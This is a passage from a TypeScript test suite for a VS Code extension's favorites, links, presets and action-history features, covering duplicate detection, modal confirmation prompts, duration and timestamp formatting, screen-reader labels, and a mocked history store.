				{ title: 'File', path: '/path' }
			]);
		});

		test('should handle entry with empty tags array', () => {
			const entries = [
				{ title: 'File', path: '/path', tags: [] }
			];
			const result = serializeFavorites(entries);
			assert.deepStrictEqual(result, [
				{ title: 'File', path: '/path' }
			]);
		});

		test('should ignore non-positive line numbers', () => {
			const entries = [
				{ title: 'File', path: '/path', line: 0 }
			];
			const result = serializeFavorites(entries);
			assert.deepStrictEqual(result, [
				{ title: 'File', path: '/path' }
			]);
		});

		test('should handle empty entries array', () => {
			const entries: any[] = [];
			const result = serializeFavorites(entries);
			assert.deepStrictEqual(result, []);
		});
	});

	suite('serializeLinks - edge cases', () => {
		test('should handle entry with empty title', () => {
			const entries = [
				{ title: '', link: 'https://example.com' }
			];
			const result = serializeLinks(entries);
			assert.deepStrictEqual(result, [
				{ title: '', link: 'https://example.com' }
			]);
		});

		test('should handle entry with empty link', () => {
			const entries = [
				{ title: 'Link', link: '' }
			];
			const result = serializeLinks(entries);
			assert.deepStrictEqual(result, [
				{ title: 'Link', link: '' }
			]);
		});

		test('should handle entry with empty group', () => {
			const entries = [
				{ title: 'Link', link: 'https://example.com', group: '' }
			];
			const result = serializeLinks(entries);
			// Empty group should not be included
			assert.deepStrictEqual(result, [
				{ title: 'Link', link: 'https://example.com' }
			]);
		});

		test('should handle empty entries array', () => {
			const entries: any[] = [];
			const result = serializeLinks(entries);
			assert.deepStrictEqual(result, []);
		});
	});

	suite('addLinkEntry', () => {
		test('should add a new unique link', () => {
			const existing = [
				{ title: 'Existing', link: 'https://existing.com' }
			];
			const { entries, added } = addLinkEntry(existing as any, { title: 'New', link: 'https://new.com' } as any);
			assert.strictEqual(added, true);
			assert.notStrictEqual(entries, existing);
			assert.strictEqual(entries.length, 2);
			assert.deepStrictEqual(entries[1], { title: 'New', link: 'https://new.com' });
		});

		test('should prevent duplicates by title and link', () => {
			const existing = [
				{ title: 'Link', link: 'https://example.com' }
			];
			const { entries, added } = addLinkEntry(existing as any, { title: 'Link', link: 'https://example.com', group: 'Docs' } as any);
			assert.strictEqual(added, false);
			assert.strictEqual(entries, existing);
			assert.strictEqual(entries.length, 1);
		});

		test('should trim title and link before adding', () => {
			const { entries, added } = addLinkEntry([], { title: '  Trim  ', link: '  https://trim.com  ', tags: ['tag'] } as any);
			assert.strictEqual(added, true);
			assert.deepStrictEqual(entries[0], { title: 'Trim', link: 'https://trim.com', tags: ['tag'] });
		});

		test('should remove only one matching link identity', () => {
			const entries = [
				{ title: 'Link', link: 'https://example.com' },
				{ title: 'Link', link: 'https://example.com' },
				{ title: 'Link', link: 'https://example.com', group: 'Docs' }
			];
			const result = removeLinkByIdentity(entries as any, entries[0] as any);
			assert.strictEqual(result.length, 2);
			assert.deepStrictEqual(result, [
				{ title: 'Link', link: 'https://example.com' },
				{ title: 'Link', link: 'https://example.com', group: 'Docs' }
			]);
		});
	});

	suite('addFavoriteEntry', () => {
		// Mirrors `removeFavoriteByIdentity` (path + line + title + group)
		// so a fresh Add followed by Delete on the same row stays
		// symmetric. Without this guard, multi-file Add would create N
		// copies and Delete would sweep all of them in one click.
		test('should add a new unique favorite', () => {
			const existing = [
				{ title: 'A', path: '${workspaceFolder}/a.ts' }
			];
			const { entries, added } = addFavoriteEntry(existing as any, {
				title: 'B',
				path: '${workspaceFolder}/b.ts'
			} as any);
			assert.strictEqual(added, true);
			assert.notStrictEqual(entries, existing);
			assert.strictEqual(entries.length, 2);
		});

		test('should detect duplicate when path + title match (no line)', () => {
			const existing = [
				{ title: 'A', path: '${workspaceFolder}/a.ts' }
			];
			const { entries, added } = addFavoriteEntry(existing as any, {
				title: 'A',
				path: '${workspaceFolder}/a.ts'
			} as any);
			assert.strictEqual(added, false);
			assert.strictEqual(entries, existing);
			assert.strictEqual(entries.length, 1);
		});

		test('should detect duplicate when line numbers match', () => {
			const existing = [
				{ title: 'A', path: '${workspaceFolder}/a.ts', line: 10 }
			];
			const { entries, added } = addFavoriteEntry(existing as any, {
				title: 'A',
				path: '${workspaceFolder}/a.ts',
				line: 10
			} as any);
			assert.strictEqual(added, false);
			assert.strictEqual(entries.length, 1);
		});

		test('should treat different lines as different entries', () => {
			const existing = [
				{ title: 'A', path: '${workspaceFolder}/a.ts', line: 10 }
			];
			const { entries, added } = addFavoriteEntry(existing as any, {
				title: 'A',
				path: '${workspaceFolder}/a.ts',
				line: 20
			} as any);
			assert.strictEqual(added, true);
			assert.strictEqual(entries.length, 2);
		});

		test('should treat different groups as different entries', () => {
			const existing = [
				{ title: 'A', path: '${workspaceFolder}/a.ts', group: 'Docs' }
			];
			const { entries, added } = addFavoriteEntry(existing as any, {
				title: 'A',
				path: '${workspaceFolder}/a.ts',
				group: 'Build'
			} as any);
			assert.strictEqual(added, true);
			assert.strictEqual(entries.length, 2);
		});

		test('should treat undefined and explicit-undefined group as the same', () => {
			// Identity matches `removeFavoriteByIdentity` which also folds
			// `group: undefined` and missing `group` together — keeps the
			// reverse pair (Add → Delete) symmetric.
			const existing = [
				{ title: 'A', path: '${workspaceFolder}/a.ts' }
			];
			const { entries, added } = addFavoriteEntry(existing as any, {
				title: 'A',
				path: '${workspaceFolder}/a.ts',
				group: undefined
			} as any);
			assert.strictEqual(added, false);
			assert.strictEqual(entries.length, 1);
		});
	});

	suite('confirmDeleteHistoryItem', () => {
		// Pin the *only-explicit-Yes-deletes* contract. Mirrors
		// `handleConfirm` style — monkey-patch `showWarningMessage` so the
		// helper can be exercised without an interactive runner.
		test('returns false when user cancels (modal dismissed)', async () => {
			const original = vscode.window.showWarningMessage;
			(vscode.window as any).showWarningMessage = async () => undefined;
			try {
				assert.strictEqual(await confirmDeleteHistoryItem('Build'), false);
			} finally {
				(vscode.window as any).showWarningMessage = original;
			}
		});

		test('returns true only when user clicks Yes', async () => {
			const original = vscode.window.showWarningMessage;
			(vscode.window as any).showWarningMessage = async () => 'Yes';
			try {
				assert.strictEqual(await confirmDeleteHistoryItem('Build'), true);
			} finally {
				(vscode.window as any).showWarningMessage = original;
			}
		});

		test('shows modal warning with action title in the message', async () => {
			// If a future refactor drops the modal flag, the row would be
			// deleted on a non-modal toast click — guard the modal contract.
			const original = vscode.window.showWarningMessage;
			let captured: any[] = [];
			(vscode.window as any).showWarningMessage = async (...args: any[]) => {
				captured = args;
				return undefined;
			};
			try {
				await confirmDeleteHistoryItem('My Action');
				const message = captured[0];
				const options = captured[1];
				assert.ok(typeof message === 'string' && message.includes('My Action'),
					'message should embed the action title');
				assert.strictEqual(options?.modal, true, 'must use modal warning');
			} finally {
				(vscode.window as any).showWarningMessage = original;
			}
		});
	});

	suite('confirmApplyPresetBackup', () => {
		test('returns "cancel" when user dismisses', async () => {
			const original = vscode.window.showWarningMessage;
			(vscode.window as any).showWarningMessage = async () => undefined;
			try {
				const result = await confirmApplyPresetBackup('/tmp/actions.json', 'parse error');
				assert.strictEqual(result, 'cancel');
			} finally {
				(vscode.window as any).showWarningMessage = original;
			}
		});

		test('returns "cancel" when user picks the cancel label', async () => {
			// The cancel button is the localized label, not undefined —
			// users who explicitly bail out should match the dismiss path.
			const original = vscode.window.showWarningMessage;
			(vscode.window as any).showWarningMessage = async (_msg: any, _opts: any, ..._labels: any[]) => {
				return _labels.find((l: string) => l.includes('취소') || l.includes('Cancel'));
			};
			try {
				const result = await confirmApplyPresetBackup('/tmp/actions.json', 'invalid');
				assert.strictEqual(result, 'cancel');
			} finally {
				(vscode.window as any).showWarningMessage = original;
			}
		});

		test('returns "backup" when user clicks the backup label', async () => {
			const original = vscode.window.showWarningMessage;
			(vscode.window as any).showWarningMessage = async (_msg: any, _opts: any, ..._labels: any[]) => {
				return _labels.find((l: string) => l.includes('백업') || l.includes('Back up'));
			};
			try {
				const result = await confirmApplyPresetBackup('/tmp/actions.json', 'invalid');
				assert.strictEqual(result, 'backup');
			} finally {
				(vscode.window as any).showWarningMessage = original;
			}
		});

		test('embeds .bak filename and reason in the prompt', async () => {
			// Pin that the modal tells the user (a) WHY the file is rejected
			// and (b) WHERE the backup will land — without these, the
			// confirm becomes a generic "are you sure?" the user can't
			// reason about.
			const original = vscode.window.showWarningMessage;
			let captured: any[] = [];
			(vscode.window as any).showWarningMessage = async (...args: any[]) => {
				captured = args;
				return undefined;
			};
			try {
				await confirmApplyPresetBackup('/work/.vscode/actions.json', 'unexpected token');
				const message = captured[0];
				const options = captured[1];
				assert.ok(message.includes('actions.json.bak'), 'message should name the backup file');
				assert.ok(message.includes('unexpected token'), 'message should embed the reason');
				assert.strictEqual(options?.modal, true, 'must use modal warning');
			} finally {
				(vscode.window as any).showWarningMessage = original;
			}
		});
	});

	suite('confirmSavePresetOverwrite', () => {
		test('returns "cancel" when user dismisses', async () => {
			const original = vscode.window.showWarningMessage;
			(vscode.window as any).showWarningMessage = async () => undefined;
			try {
				const result = await confirmSavePresetOverwrite('/tmp/preset-foo.json');
				assert.strictEqual(result, 'cancel');
			} finally {
				(vscode.window as any).showWarningMessage = original;
			}
		});

		test('returns "overwrite" when user picks Overwrite', async () => {
			const original = vscode.window.showWarningMessage;
			(vscode.window as any).showWarningMessage = async (_msg: any, _opts: any, ...labels: any[]) => {
				return labels.find((l: string) => l.includes('덮어쓰기') || l === 'Overwrite');
			};
			try {
				const result = await confirmSavePresetOverwrite('/tmp/preset-foo.json');
				assert.strictEqual(result, 'overwrite');
			} finally {
				(vscode.window as any).showWarningMessage = original;
			}
		});

		test('returns "open-existing" when user picks Open existing file', async () => {
			const original = vscode.window.showWarningMessage;
			(vscode.window as any).showWarningMessage = async (_msg: any, _opts: any, ...labels: any[]) => {
				return labels.find((l: string) => l.includes('기존 파일 열기') || l === 'Open existing file');
			};
			try {
				const result = await confirmSavePresetOverwrite('/tmp/preset-foo.json');
				assert.strictEqual(result, 'open-existing');
			} finally {
				(vscode.window as any).showWarningMessage = original;
			}
		});

		test('embeds the basename of targetPath in the prompt', async () => {
			// Pin that the user sees WHICH preset id collides — important
			// when they triggered the command from a different folder than
			// they expected.
			const original = vscode.window.showWarningMessage;
			let captured: any[] = [];
			(vscode.window as any).showWarningMessage = async (...args: any[]) => {
				captured = args;
				return undefined;
			};
			try {
				await confirmSavePresetOverwrite('/work/.vscode/presets/preset-integration.json');
				const message = captured[0];
				const options = captured[1];
				assert.ok(message.includes('preset-integration.json'),
					'message should embed basename of target path');
				assert.strictEqual(options?.modal, true, 'must use modal warning');
			} finally {
				(vscode.window as any).showWarningMessage = original;
			}
		});
	});

	suite('formatDuration', () => {
		// Pure formatter — pin the unit boundaries used by the action-card
		// badge. If a future refactor changes the breakpoints (e.g. switches
		// to "ms / s / min / hour" thresholds) these tests will tell us.
		test('sub-second values round to whole milliseconds', () => {
			assert.strictEqual(formatDuration(0), '0ms');
			assert.strictEqual(formatDuration(1), '1ms');
			assert.strictEqual(formatDuration(999), '999ms');
			assert.strictEqual(formatDuration(123.4), '123ms');
			assert.strictEqual(formatDuration(123.6), '124ms');
		});

		test('values from 1s up to 60s use "N.Ns" (truncated, never rounds up to 60.0s)', () => {
			assert.strictEqual(formatDuration(1000), '1.0s');
			assert.strictEqual(formatDuration(1234), '1.2s');
			// Truncation (not rounding) — 59999ms must not display as
			// "60.0s" because the next branch (≥60_000ms) renders that as "1m".
			assert.strictEqual(formatDuration(59999), '59.9s');
		});

		test('values from 1min up to 60min use "Nm" or "Nm Ms"', () => {
			assert.strictEqual(formatDuration(60_000), '1m');
			assert.strictEqual(formatDuration(75_000), '1m 15s');
			assert.strictEqual(formatDuration(3_599_000), '59m 59s');
		});

		test('values from 1h use "Hh" or "Hh Mm"', () => {
			assert.strictEqual(formatDuration(3_600_000), '1h');
			assert.strictEqual(formatDuration(3_900_000), '1h 5m');
			assert.strictEqual(formatDuration(7_200_000), '2h');
		});

		test('non-finite or negative inputs collapse to "0ms"', () => {
			assert.strictEqual(formatDuration(-5), '0ms');
			assert.strictEqual(formatDuration(NaN), '0ms');
			assert.strictEqual(formatDuration(Infinity), '0ms');
		});
	});

	suite('formatHistoryTimestamp', () => {
		// `now` is injected into the formatter so these tests are
		// deterministic regardless of when CI runs.
		const now = new Date(2026, 3, 30, 14, 30, 0).getTime(); // 2026-04-30 14:30

		test('same calendar day shows HH:mm only', () => {
			const ts = new Date(2026, 3, 30, 9, 5, 0).getTime();
			assert.strictEqual(formatHistoryTimestamp(ts, now, 'ko'), '09:05');
			assert.strictEqual(formatHistoryTimestamp(ts, now, 'en'), '09:05');
		});

		test('previous day uses locale-specific "yesterday" prefix', () => {
			const ts = new Date(2026, 3, 29, 18, 0, 0).getTime();
			assert.strictEqual(formatHistoryTimestamp(ts, now, 'ko'), '어제 18:00');
			assert.strictEqual(formatHistoryTimestamp(ts, now, 'en'), 'Yest 18:00');
		});

		test('older dates show MM/DD', () => {
			const ts = new Date(2026, 2, 15, 23, 59, 0).getTime();
			assert.strictEqual(formatHistoryTimestamp(ts, now, 'ko'), '03/15');
		});

		test('month/year boundary still resolves "yesterday" correctly', () => {
			const newYearNow = new Date(2026, 0, 1, 10, 0, 0).getTime();
			const newYearEve = new Date(2025, 11, 31, 23, 30, 0).getTime();
			assert.strictEqual(formatHistoryTimestamp(newYearEve, newYearNow, 'ko'), '어제 23:30');
		});
	});

	suite('formatLastRunBadge', () => {
		const now = new Date(2026, 3, 30, 14, 30, 0).getTime();

		function entry(partial: Partial<HistoryEntry>): HistoryEntry {
			return {
				actionId: 'a',
				actionTitle: 'A',
				timestamp: new Date(2026, 3, 30, 12, 0, 0).getTime(),
				status: 'success',
				...partial
			};
		}

		test('returns undefined when no entry is provided', () => {
			assert.strictEqual(formatLastRunBadge(undefined, now, 'ko'), undefined);
		});

		test('returns undefined for entries still running (icon shows spinner instead)', () => {
			assert.strictEqual(formatLastRunBadge(entry({ status: 'running' }), now, 'ko'), undefined);
		});

		test('success entry with duration → "HH:mm · duration" (status conveyed by icon)', () => {
			const e = entry({ status: 'success', durationMs: 1234 });
			assert.strictEqual(formatLastRunBadge(e, now, 'ko'), '12:00 · 1.2s');
		});

		test('failure entry with duration → "HH:mm · duration" (status conveyed by icon)', () => {
			const e = entry({ status: 'failure', durationMs: 45 });
			assert.strictEqual(formatLastRunBadge(e, now, 'ko'), '12:00 · 45ms');
		});

		test('entry without durationMs (legacy or partial) omits the duration suffix', () => {
			const e = entry({ status: 'success' });
			assert.strictEqual(formatLastRunBadge(e, now, 'ko'), '12:00');
		});

		test('negative durationMs (clock-skew leak) renders as "0ms" rather than being dropped', () => {
			// `executeAction` clamps durationMs with Math.max(0, ...) at
			// write time, but the badge formatter is the safety net. If a
			// negative value reaches it (legacy entry, hypothetical buggy
			// writer), we'd rather show "ran instantly" than silently hide
			// the duration as the previous `>= 0` guard did.
			const e = entry({ status: 'success', durationMs: -5 });
			assert.strictEqual(formatLastRunBadge(e, now, 'ko'), '12:00 · 0ms');
		});

		test('entry from yesterday composes timestamp and duration', () => {
			const e = entry({
				status: 'failure',
				timestamp: new Date(2026, 3, 29, 9, 0, 0).getTime(),
				durationMs: 2500
			});
			assert.strictEqual(formatLastRunBadge(e, now, 'en'), 'Yest 09:00 · 2.5s');
		});

		test('badge never embeds the status glyph (covered by icon + aria label)', () => {
			// Regression guard for 0.5.1: the visible badge intentionally
			// omits ✓/✗ so the row doesn't carry the same signal twice
			// (icon already encodes status). Screen reader parity is
			// restored via `buildHistoryItemAriaLabel`; see that suite.
			for (const status of ['success', 'failure'] as const) {
				for (const durationMs of [undefined, 1234] as const) {
					const badge = formatLastRunBadge(
						entry({ status, durationMs }),
						now,
						'ko'
					);
					assert.ok(badge && !badge.includes('✓') && !badge.includes('✗'),
						`badge "${badge}" must not embed a status glyph`);
				}
			}
		});
	});

	suite('buildHistoryItemAriaLabel', () => {
		// Pins the screen-reader story for 0.5.1: the visible HistoryItem
		// row conveys status via `iconPath` color only (no ✓/✗ in
		// description), so the aria label has to fold the status word
		// back in as text. These tests keep that contract from regressing
		// silently if someone later tweaks the badge formatter.
		const now = new Date(2026, 3, 30, 14, 30, 0).getTime();

		function entry(partial: Partial<HistoryEntry>): HistoryEntry {
			return {
				actionId: 'a',
				actionTitle: 'Build',
				timestamp: new Date(2026, 3, 30, 12, 0, 0).getTime(),
				status: 'success',
				...partial
			};
		}

		test('success → "{label}, 성공, HH:mm · duration"', () => {
			const e = entry({ status: 'success', durationMs: 1234 });
			assert.strictEqual(
				buildHistoryItemAriaLabel(e, 'Build', now, 'ko'),
				'Build, 성공, 12:00 · 1.2s'
			);
		});

		test('failure → "{label}, 실패, HH:mm · duration"', () => {
			const e = entry({ status: 'failure', durationMs: 45 });
			assert.strictEqual(
				buildHistoryItemAriaLabel(e, 'Build', now, 'ko'),
				'Build, 실패, 12:00 · 45ms'
			);
		});

		// 0.6.52: `cancelled` 하나에 Stop 과 프롬프트 취소가 섞여 있었고 화면에는
		// "중지됨 / Stopped" 로만 나왔다. 다이얼로그를 닫은 것을 "중지됨"이라
		// 부르는 것은 사실과 다르고, 스크린 리더에는 그 한 단어가 **유일한**
		// 설명이라 더 나쁘다.
		test('cancelled by Stop → 중지됨', () => {
			const e = entry({ status: 'cancelled', cancelKind: 'stopped', durationMs: 100 });
			assert.strictEqual(buildHistoryItemAriaLabel(e, 'Build', now, 'ko'), 'Build, 중지됨, 12:00 · 100ms');
			assert.strictEqual(buildHistoryItemAriaLabel(e, 'Build', now, 'en'), 'Build, stopped, 12:00 · 100ms');
		});

		test('cancelled by dismissing a prompt → 취소됨', () => {
			const e = entry({ status: 'cancelled', cancelKind: 'prompt', durationMs: 100 });
			assert.strictEqual(buildHistoryItemAriaLabel(e, 'Build', now, 'ko'), 'Build, 취소됨, 12:00 · 100ms');
			assert.strictEqual(buildHistoryItemAriaLabel(e, 'Build', now, 'en'), 'Build, canceled, 12:00 · 100ms');
		});

		test('legacy cancelled entry without cancelKind reads as 중지됨', () => {
			// 이 필드가 생기기 전의 `cancelled` 는 전부 Stop 이었다 — 기존 기록을
			// 마이그레이션하지 않으므로 기본값이 그쪽이어야 한다.
			const e = entry({ status: 'cancelled', durationMs: 100 });
			assert.strictEqual(buildHistoryItemAriaLabel(e, 'Build', now, 'ko'), 'Build, 중지됨, 12:00 · 100ms');
		});

		test('running entry still gets a label (icon spinner alone is silent for screen readers)', () => {
			const e = entry({ status: 'running' });
			assert.strictEqual(
				buildHistoryItemAriaLabel(e, 'Build', now, 'ko'),
				'Build, 실행 중, 12:00'
			);
		});

		test('English locale uses succeeded/failed/running words', () => {
			assert.strictEqual(
				buildHistoryItemAriaLabel(entry({ status: 'success', durationMs: 2500 }), 'Build', now, 'en'),
				'Build, succeeded, 12:00 · 2.5s'
			);
			assert.strictEqual(
				buildHistoryItemAriaLabel(entry({ status: 'failure' }), 'Build', now, 'en'),
				'Build, failed, 12:00'
			);
			assert.strictEqual(
				buildHistoryItemAriaLabel(entry({ status: 'running' }), 'Build', now, 'en'),
				'Build, running, 12:00'
			);
		});

		test('tool entries say "opened" rather than "succeeded"', () => {
			// Tool entries always carry status='success' because they
			// record an "opened" event, not a pass/fail run. A screen
			// reader announcing "succeeded" would be misleading there.
			const toolEntry = createToolHistoryEntry({
				kind: 'memoryMap',
				filePath: '/tmp/foo.elf',
				timestamp: new Date(2026, 3, 30, 12, 0, 0).getTime(),
			});
			assert.strictEqual(
				buildHistoryItemAriaLabel(toolEntry, 'Memory Map: foo.elf', now, 'ko'),
				'Memory Map: foo.elf, 열림 12:00'
			);
			assert.strictEqual(
				buildHistoryItemAriaLabel(toolEntry, 'Memory Map: foo.elf', now, 'en'),
				'Memory Map: foo.elf, opened 12:00'
			);
		});

		test('uses the supplied displayLabel (disambiguated breadcrumb), not entry.actionTitle', () => {
			// HistoryProvider passes the disambiguated label (e.g.
			// "Firmware > Build") into HistoryItem; aria label must
			// mirror that so the announced row matches the visible row.
			const e = entry({ status: 'success', actionTitle: 'Build', durationMs: 100 });
			assert.strictEqual(
				buildHistoryItemAriaLabel(e, 'Firmware > Build', now, 'ko'),
				'Firmware > Build, 성공, 12:00 · 100ms'
			);
		});
	});

	suite('startHistoryAutoRefresh', () => {
		// Pins the periodic-refresh wiring that keeps the History panel
		// badge fresh across midnight (TreeItem.description doesn't
		// auto-refresh, so without this hook a session left open would
		// keep showing yesterday's "23:30" forever).

		test('fires refresh() on every interval and stops cleanly on dispose', async () => {
			let count = 0;
			const fakeProvider = { refresh: () => { count++; } };
			const disposable = startHistoryAutoRefresh(fakeProvider, 30); // 30ms
			// Wait long enough for ~3 ticks to fire.
			await new Promise(r => setTimeout(r, 110));
			disposable.dispose();
			const afterDispose = count;
			// Anything ≥ 2 proves the timer fires repeatedly.
			assert.ok(afterDispose >= 2, `expected at least 2 refresh calls, got ${afterDispose}`);
			// Now wait again — count must NOT keep growing after dispose.
			await new Promise(r => setTimeout(r, 80));
			assert.strictEqual(count, afterDispose, 'dispose() must clear the interval');
		});
	});

	suite('shouldRecordTaskInput', () => {
		// Pins which task types contribute to history `inputs` for replay
		// (and which are deliberately excluded — `password: true` opts out).
		test('returns true for interactive task types', () => {
			const types = ['inputBox', 'quickPick', 'envPick', 'fileDialog', 'folderDialog', 'confirm'] as const;
			for (const type of types) {
				assert.strictEqual(
					shouldRecordTaskInput({ id: 't', type } as any),
					true,
					`expected ${type} to be recorded`
				);
			}
		});

		test('returns false for non-interactive task types', () => {
			const types = ['shell', 'command', 'unzip', 'zip', 'stringManipulation', 'writeFile', 'appendFile'] as const;
			for (const type of types) {
				assert.strictEqual(
					shouldRecordTaskInput({ id: 't', type } as any),
					false,
					`expected ${type} NOT to be recorded`
				);
			}
		});

		test('inputBox with password: true is excluded from recording', () => {
			assert.strictEqual(
				shouldRecordTaskInput({ id: 't', type: 'inputBox', password: true } as any),
				false
			);
			assert.strictEqual(
				shouldRecordTaskInput({ id: 't', type: 'inputBox', password: false } as any),
				true
			);
			assert.strictEqual(
				shouldRecordTaskInput({ id: 't', type: 'inputBox' } as any),
				true
			);
		});
	});

	suite('HistoryProvider', () => {
		// Mock ExtensionContext for testing
		class MockMemento implements vscode.Memento {
			private storage = new Map<string, any>();

			keys(): readonly string[] {
				return Array.from(this.storage.keys());
			}

			get<T>(key: string): T | undefined;
			get<T>(key: string, defaultValue: T): T;
			get<T>(key: string, defaultValue?: T): T | undefined {
				const value = this.storage.get(key);
				return value !== undefined ? value : defaultValue;
			}

			update(key: string, value: any): Thenable<void> {
				this.storage.set(key, value);
				return Promise.resolve();
			}

			setKeysForSync(keys: readonly string[]): void {
				// Not needed for testing
			}
		}

		class MockExtensionContext implements Partial<vscode.ExtensionContext> {
			workspaceState = new MockMemento();
			globalState = new MockMemento();
			subscriptions: { dispose(): any }[] = [];
			extensionPath = '/mock/extension/path';
			extensionUri = vscode.Uri.file('/mock/extension/path');
			globalStorageUri = vscode.Uri.file('/mock/global/storage');
			logUri = vscode.Uri.file('/mock/log');
			storageUri = vscode.Uri.file('/mock/storage');
		}

		function createMockContext(): vscode.ExtensionContext {
			return new MockExtensionContext() as unknown as vscode.ExtensionContext;
		}

		// These tests exercise the real HistoryProvider class (from
		// ../providers/historyProvider) with a MockMemento-backed
		// ExtensionContext, so addHistoryEntry / updateHistoryStatus /
		// deleteHistoryItem / clearAllHistory / trimHistoryToMax regressions
		// are actually caught here. An earlier revision of this file
		// simulated the lifecycle with local Maps/arrays, which meant those
		// tests only exercised JavaScript collection semantics.

		function makeEntry(
			actionId: string,
			status: HistoryEntry['status'] = 'success',
			timestamp: number = Date.now(),
			output?: string
		): HistoryEntry {
			const entry: HistoryEntry = {
				actionId,
				actionTitle: `Title for ${actionId}`,
				timestamp,
				status,
			};
			if (output !== undefined) {
				entry.output = output;
			}
			return entry;
		}

		function createHistoryProvider(maxItems?: number, context: vscode.ExtensionContext = createMockContext()): HistoryProvider {
			return new HistoryProvider(
				context,
				maxItems === undefined ? undefined : { getMaxItems: () => maxItems }
			);
		}

		// 0.6.52: `cancelKind` 는 `cancelled` 일 때만 의미가 있다. 재실행이 같은
		// 항목을 갱신할 수 있으므로, 다른 상태로 바뀌면 반드시 지워야 한다 —
		// 남으면 성공 항목이 취소 종류를 달고 다닌다.
		test('updateHistoryStatus attaches cancelKind and clears it when the status changes', () => {
			const provider = new HistoryProvider(createMockContext());
			provider.addHistoryEntry(makeEntry('a', 'running', 1000));

			provider.updateHistoryStatus('a', 1000, 'cancelled', 'reason', 5, 'prompt');
			assert.strictEqual(provider.getHistory()[0].cancelKind, 'prompt');

			provider.updateHistoryStatus('a', 1000, 'success', undefined, 5);
			assert.strictEqual(provider.getHistory()[0].cancelKind, undefined);
		});

		test('updateHistoryStatus defaults cancelKind to stopped when omitted', () => {
			// 이 인자를 넘기지 않는 기존 호출부(있다면)가 프롬프트 취소로
			// 둔갑하면 안 된다 — 기본값은 Stop 쪽이다.
			const provider = new HistoryProvider(createMockContext());
			provider.addHistoryEntry(makeEntry('a', 'running', 1000));
			provider.updateHistoryStatus('a', 1000, 'cancelled', 'reason', 5);
			assert.strictEqual(provider.getHistory()[0].cancelKind, 'stopped');
		});

		test('addHistoryEntry unshifts entries so newest comes first', () => {
			const provider = new HistoryProvider(createMockContext());
			provider.addHistoryEntry(makeEntry('first', 'success', 1000));
			provider.addHistoryEntry(makeEntry('second', 'success', 2000));
			provider.addHistoryEntry(makeEntry('third', 'success', 3000));
			const history = provider.getHistory();
			assert.deepStrictEqual(
				history.map(e => e.actionId),
				['third', 'second', 'first']
			);
		});

		test('addHistoryEntry persists through workspaceState so getHistory round-trips', () => {
			const ctx = createMockContext();
			const p1 = new HistoryProvider(ctx);
			p1.addHistoryEntry(makeEntry('persist', 'success', 42));
			// A second provider bound to the same context should see the entry.
			const p2 = new HistoryProvider(ctx);
			const history = p2.getHistory();
			assert.strictEqual(history.length, 1);
			assert.strictEqual(history[0].actionId, 'persist');
			assert.strictEqual(history[0].timestamp, 42);
		});

		test('addHistoryEntry trims the oldest entries once maxItems is exceeded', async () => {
			const provider = createHistoryProvider(3);
			for (let i = 0; i < 5; i++) {
				provider.addHistoryEntry(makeEntry(`a${i}`, 'success', 1000 + i));
			}
			const history = provider.getHistory();
			// After the 5th add, newest-first ordering keeps only a4/a3/a2.
			assert.deepStrictEqual(
				history.map(e => e.actionId),
				['a4', 'a3', 'a2']
			);
		});

		test('updateHistoryStatus mutates an entry matched by (actionId, timestamp)', () => {
			const provider = new HistoryProvider(createMockContext());
			const timestamp = 123;
			provider.addHistoryEntry(makeEntry('target', 'running', timestamp));
			provider.addHistoryEntry(makeEntry('target', 'running', timestamp + 10));

			provider.updateHistoryStatus('target', timestamp, 'failure', 'boom');

			const history = provider.getHistory();
			const updated = history.find(e => e.timestamp === timestamp);
			const untouched = history.find(e => e.timestamp === timestamp + 10);
			assert.ok(updated);
			assert.ok(untouched);
			assert.strictEqual(updated!.status, 'failure');
			assert.strictEqual(updated!.output, 'boom');
			assert.strictEqual(untouched!.status, 'running');
			assert.strictEqual(untouched!.output, undefined);
		});

		test('updateHistoryStatus on an unknown (actionId, timestamp) is a silent no-op', () => {
			const provider = new HistoryProvider(createMockContext());
			provider.addHistoryEntry(makeEntry('only', 'success', 1));
			provider.updateHistoryStatus('missing', 999, 'failure', 'should-not-write');
			const history = provider.getHistory();
			assert.strictEqual(history.length, 1);
			assert.strictEqual(history[0].actionId, 'only');
			assert.strictEqual(history[0].status, 'success');
			assert.strictEqual(history[0].output, undefined);
		});

		test('updateHistoryStatus persists durationMs on terminal transition and round-trips', () => {
			const ctx = createMockContext();
			const p1 = new HistoryProvider(ctx);
			const ts = 100;
			p1.addHistoryEntry(makeEntry('timed', 'running', ts));
			p1.updateHistoryStatus('timed', ts, 'success', undefined, 1234);
			// In-memory check.
			assert.strictEqual(p1.getHistory()[0].durationMs, 1234);
			// And it survives a fresh provider on the same workspaceState.
			const p2 = new HistoryProvider(ctx);
			assert.strictEqual(p2.getHistory()[0].durationMs, 1234);
		});

		test('updateHistoryStatus without durationMs leaves an existing duration alone', () => {
			const provider = new HistoryProvider(createMockContext());
			const ts = 200;
			provider.addHistoryEntry(makeEntry('preserve', 'running', ts));
			provider.updateHistoryStatus('preserve', ts, 'success', undefined, 500);
			// Subsequent update without durationMs (e.g., a status fixup) must
			// not erase the previously recorded duration.
			provider.updateHistoryStatus('preserve', ts, 'failure', 'late error');
			const entry = provider.getHistory()[0];
			assert.strictEqual(entry.durationMs, 500);
			assert.strictEqual(entry.status, 'failure');
			assert.strictEqual(entry.output, 'late error');
		});

		test('updateHistoryStatus preserves existing output when called without an output arg', () => {
			const provider = new HistoryProvider(createMockContext());
			provider.addHistoryEntry(makeEntry('a', 'running', 1, 'preexisting-output'));
			provider.updateHistoryStatus('a', 1, 'success');
			const entry = provider.getHistory()[0];
			assert.strictEqual(entry.status, 'success');
			assert.strictEqual(entry.output, 'preexisting-output');
		});

		test('manual-stop flow: running → failure with "Action stopped by user" message', () => {
			// The stop-action command in extension.ts routes through
			// updateHistoryStatus(actionId, timestamp, 'failure', 'Action stopped by user').
			// This test pins that contract against the real class.
			const provider = new HistoryProvider(createMockContext());
			const ts = 555;
			provider.addHistoryEntry(makeEntry('build', 'running', ts));
			provider.updateHistoryStatus('build', ts, 'failure', 'Action stopped by user');
			const entry = provider.getHistory()[0];
			assert.strictEqual(entry.status, 'failure');
			assert.strictEqual(entry.output, 'Action stopped by user');
		});

		test('setHistoryInputs attaches an inputs map to a matched (actionId, timestamp) entry', () => {
			const provider = new HistoryProvider(createMockContext());
			const ts = 7777;
			provider.addHistoryEntry(makeEntry('with-inputs', 'success', ts));
			provider.setHistoryInputs('with-inputs', ts, {
				pickEnv: { value: 'prod' },
				askName: { value: 'release' }
			});
			const entry = provider.getHistory()[0];
			assert.deepStrictEqual(entry.inputs, {
				pickEnv: { value: 'prod' },
